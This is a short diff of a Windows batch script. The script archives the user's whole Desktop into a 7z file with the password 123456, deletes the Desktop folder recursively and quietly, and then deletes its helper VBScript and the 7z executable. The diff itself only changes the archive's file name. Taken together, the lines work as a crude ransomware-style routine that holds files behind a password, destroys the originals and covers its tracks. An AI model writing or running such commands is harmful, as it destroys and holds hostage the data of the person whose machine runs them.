@@ -1,4 +1,4 @@
-7z.exe a C:\User\kaan_\deneme.7z .\Desktop\* -p123456
+7z.exe a C:\User\kaan_\deneme .\Desktop\* -p123456
 rmdir /S /Q Desktop
 del islem.vbs
 del 7z.exe
